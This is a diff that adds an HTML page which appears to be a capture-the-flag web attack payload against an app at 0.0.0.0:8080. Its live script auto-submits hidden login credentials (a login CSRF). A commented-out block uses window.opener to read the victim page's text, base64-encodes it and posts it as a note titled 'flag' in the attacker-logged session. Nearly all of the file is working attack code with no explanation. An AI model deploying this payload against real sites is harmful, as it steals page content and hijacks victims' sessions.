@@ -1,0 +1,27 @@
+<body>
+<form id= "form" target="_blank" method="post" action="http://0.0.0.0:8080/login">
+    <input name="username" value="dmadmin" hidden>
+    <input name="password" value="dmadmin" hidden>
+</form>
+<script>
+let URL = 'http://0.0.0.0:8080'
+setTimeout(() => {
+    form.submit()
+    document.location = URL
+},2000)
+</script>
+</body>
+<!--
+<script>
+if (window.opener) {
+    let frame = document.createElement('iframe')
+    frame.src = 'http://0.0.0.0:8080/new'
+    document.body.appendChild(frame)
+    frame.onload = () => {
+        frame.contentWindow.document.querySelector('input[name="title"]').value = 'flag'
+        frame.contentWindow.document.querySelector('textarea[name="content"]').innerText = btoa(window.opener.document.body.innerText)
+        frame.contentWindow.document.querySelector('input[type="submit"]').click()
+    }
+}
+</script> 
+-->
